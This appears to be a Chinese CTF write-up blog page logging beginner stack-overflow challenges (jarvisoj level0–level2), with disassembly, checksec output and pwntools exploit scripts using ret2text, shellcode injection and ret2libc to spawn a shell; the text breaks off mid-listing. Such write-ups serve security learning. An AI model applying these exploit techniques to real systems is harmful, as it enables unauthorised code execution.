<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-bounce.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="初入pwn,栈溢出的刷题记录">
<meta property="og:type" content="article">
<meta property="og:title" content="刷题记录 0x1">
<meta property="og:url" content="http://example.com/2021/07/11/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-0x1/index.html">
<meta property="og:site_name" content="STERIA LAB">
<meta property="og:description" content="初入pwn,栈溢出的刷题记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="e:/Blog/source_posts/刷题记录-0x1/easy_go.png">
<meta property="og:image" content="e:/Blog/source_posts/刷题记录-0x1/hitcontraining_playfmt.png">
<meta property="article:published_time" content="2021-07-11T14:01:54.000Z">
<meta property="article:modified_time" content="2021-10-05T11:34:18.000Z">
<meta property="article:author" content="STEVE">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="e:/Blog/source_posts/刷题记录-0x1/easy_go.png">

<link rel="canonical" href="http://example.com/2021/07/11/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-0x1/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>刷题记录 0x1 | STERIA LAB</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">STERIA LAB</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">for my study life</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/11/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-0x1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="STEVE">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="STERIA LAB">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          刷题记录 0x1
        </h1>

        <div class="post-meta">

            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-11 22:01:54" itemprop="dateCreated datePublished" datetime="2021-07-11T22:01:54+08:00">2021-07-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-05 19:34:18" itemprop="dateModified" datetime="2021-10-05T19:34:18+08:00">2021-10-05</time>
              </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>初入pwn,栈溢出的刷题记录</p>
<span id="more"></span>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><h3 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h3><blockquote>
<p>普通的栈溢出</p>
</blockquote>
<ul>
<li>checksec</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000) </span><br></pre></td></tr></table></figure>

<ul>
<li>main函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">var_10= qword ptr -10h</span><br><span class="line">var_4= dword ptr -4</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp   ; 保存上一个函数的rbp</span><br><span class="line">mov     rbp, rsp  ; 将main函数的rbp调到上一个函数的rsp的位置 </span><br><span class="line">sub     rsp, 10h  ; 开辟10h的栈空间</span><br><span class="line">mov     [rbp+var_4], edi  ;注意到这个程序是amd64,按照64位linux程序的函数调用约定</span><br><span class="line">mov     [rbp+var_10], rsi  ;三个参数从左至右在RDI,RSI,RDX,这里是先保护了上一个函数edi和rsi的值</span><br><span class="line">mov     edx, 0Dh        ; n</span><br><span class="line">mov     esi, offset aHelloWorld ; &quot;Hello, World\n&quot;</span><br><span class="line">mov     edi, 1          ; fd</span><br><span class="line">call    _write</span><br><span class="line">mov     eax, 0  ; 返回值清零</span><br><span class="line">call    vulnerable_function  ;调用目标函数</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 4005C6</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>

<ul>
<li>vulnerable_function</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public vulnerable_function</span><br><span class="line">vulnerable_function proc near</span><br><span class="line"></span><br><span class="line">buf= byte ptr -80h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">add     rsp, 0FFFFFFFFFFFFFF80h    ; 这一句的意思就是sub rsp, 80h(add esp, -xx)</span><br><span class="line">lea     rax, [rbp+buf]  ; lea是把[rbp+buf]的地址给rax存储</span><br><span class="line">mov     edx, 200h       ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">call    _read</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 4005A6</span><br><span class="line">vulnerable_function endp</span><br></pre></td></tr></table></figure>

<h4 id="补码，负数"><a href="#补码，负数" class="headerlink" title="补码，负数"></a>补码，负数</h4><ul>
<li><p>0FFFFFFFFFFFFFF80h:按照补码存储的负数,最高位1表示负数,0表示正数,这里最前面的0和最后面的h是16进制标志,F:1111,可以看出来是负数,先减一后取反,就是0x80h,注意128(0x80h)是一个特例,例如:127(0xFF81)不是最后两位十六进制数</p>
</li>
<li><p>callsystem</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public callsystem</span><br><span class="line">callsystem proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">call    _system</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 400596</span><br><span class="line">callsystem endp</span><br></pre></td></tr></table></figure>

<p>一个后门函数</p>
</li>
<li><p>exp(python2)</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;./jarvisoj_level0&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">glibc_version = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    p = process(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25475</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span> + <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span>  + p64(<span class="number">0x400596</span>)  <span class="comment"># 用a覆盖掉0x80大小的栈空间,然后b覆盖掉保存的调用函数的ebp的位置,接着就是返回地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd += <span class="string">&quot;break main&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>注意payload那一句是python2的写法</li>
</ul>
<h3 id="jarvisoj-level1"><a href="#jarvisoj-level1" class="headerlink" title="jarvisoj_level1"></a>jarvisoj_level1</h3><blockquote>
<p>ret2codeshell(未开NX保护)</p>
</blockquote>
<ul>
<li>checksec</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<ul>
<li><p>开了RELRO保护</p>
</li>
<li><p>未开NX保护</p>
</li>
<li><p>main</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame fuzzy-sp</span><br><span class="line"></span><br><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">var_4= dword ptr -4</span><br><span class="line">argc= dword ptr  8</span><br><span class="line">argv= dword ptr  0Ch</span><br><span class="line">envp= dword ptr  10h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">lea     ecx, [esp+4]</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    dword ptr [ecx-4]</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ecx</span><br><span class="line">sub     esp, 4</span><br><span class="line">call    vulnerable_function</span><br><span class="line">sub     esp, 4</span><br><span class="line">push    0Eh             ; n</span><br><span class="line">push    offset aHelloWorld ; &quot;Hello, World!\n&quot;</span><br><span class="line">push    1               ; fd</span><br><span class="line">call    _write</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 80484B7</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>

<ul>
<li>vulnerable_function</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public vulnerable_function</span><br><span class="line">vulnerable_function proc near</span><br><span class="line"></span><br><span class="line">buf= byte ptr -88h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">sub     esp, 88h  ; 局部变量空间 0x88h</span><br><span class="line">sub     esp, 8     ; 栈平衡和下面的add     esp, 10h对应</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">push    eax</span><br><span class="line">push    offset format   ; &quot;What&#x27;s this:%p?\n&quot;</span><br><span class="line">call    _printf</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 4</span><br><span class="line">push    100h            ; nbytes</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">push    eax             ; buf</span><br><span class="line">push    0               ; fd</span><br><span class="line">call    _read</span><br><span class="line">add     esp, 10h</span><br><span class="line">nop</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 804847B</span><br><span class="line">vulnerable_function endp</span><br></pre></td></tr></table></figure>

<ul>
<li>exp</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;./jarvisoj_level1&#x27;</span></span><br><span class="line">context(binary=file_path, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">glibc_version = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    p = process(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28673</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;this:&quot;</span>)</span><br><span class="line">buff_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)  <span class="comment"># 通过IDA可以看出来%p打印的是栈的基地址</span></span><br><span class="line">p.recvline()  <span class="comment"># 把%p后面的&quot;?\n&quot;接收</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())  <span class="comment"># pwntools 写shellcode</span></span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x88</span>, <span class="string">&quot;a&quot;</span>) + <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span> + p32(buff_addr)</span><br><span class="line"><span class="comment"># 先写入shellcode,ljust左对齐,填充&quot;a&quot;,4位的&#x27;b&#x27;覆盖ebp,然后返回地址指向栈的基地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li><p>注: buu上原题,靶机接收部分出了问题,这个脚本本地可以打通</p>
</li>
<li><p>ret2libc版</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;./jarvisoj_level1&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># glibc_version = &#x27;2.27&#x27;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调试或执行函数</span></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    p = process(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25862</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x804849E</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span></span><br><span class="line">payload += p32(write_plt) + p32(main_addr) + p32(<span class="number">0x1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">write = <span class="number">0x0f23c0</span>  <span class="comment"># 这三个地址是用网站通过上面的偏移找的</span></span><br><span class="line">libc_base = write_addr - write</span><br><span class="line">system = libc_base + <span class="number">0x04a470</span></span><br><span class="line">binsh = libc_base + <span class="number">0x18ee0e</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span> + p32(system) + p32(main_addr) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-level2-x86"><a href="#jarvisoj-level2-x86" class="headerlink" title="jarvisoj_level2_x86"></a>jarvisoj_level2_x86</h3><blockquote>
<p>ret2text</p>
</blockquote>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<ul>
<li>NX保护开启</li>
</ul>
<p>main</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame fuzzy-sp</span><br><span class="line"></span><br><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">var_4= dword ptr -4</span><br><span class="line">argc= dword ptr  8</span><br><span class="line">argv= dword ptr  0Ch</span><br><span class="line">envp= dword ptr  10h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">lea     ecx, [esp+4]</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    dword ptr [ecx-4]</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ecx</span><br><span class="line">sub     esp, 4</span><br><span class="line">call    vulnerable_function</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    offset aEchoHelloWorld ; &quot;echo &#x27;Hello World!&#x27;&quot;</span><br><span class="line">call    _system</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 8048480</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>

<p>vulnerable_function</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public vulnerable_function</span><br><span class="line">vulnerable_function proc near</span><br><span class="line"></span><br><span class="line">buf= byte ptr -88h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">sub     esp, 88h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    offset command  ; &quot;echo Input:&quot;</span><br><span class="line">call    _system</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 4</span><br><span class="line">push    100h            ; nbytes</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">push    eax             ; buf</span><br><span class="line">push 